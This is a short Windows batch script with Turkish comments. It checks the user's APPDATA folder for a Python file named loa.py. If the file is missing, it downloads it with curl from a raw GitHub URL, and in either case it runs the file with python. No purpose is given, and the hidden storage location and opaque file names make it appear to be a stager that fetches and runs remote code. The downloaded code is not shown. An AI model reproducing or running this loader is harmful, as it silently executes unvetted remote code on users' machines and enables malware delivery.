@echo off
set "pyfile=%APPDATA%\loa.py"

:: Python dosyası var mı kontrol et
if exist "%pyfile%" (
    echo [*] Dosya bulundu: %pyfile%
    python "%pyfile%"
) else (
    echo [!] Dosya bulunamadı. İndiriliyor...
    curl -L -o "%pyfile%" "https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/create3.py"
    if exist "%pyfile%" (
        echo [+] Indirme basarili. Calistiriliyor...
        python "%pyfile%"
    ) else (
        echo [-] Indirme basarisiz.
    )
)
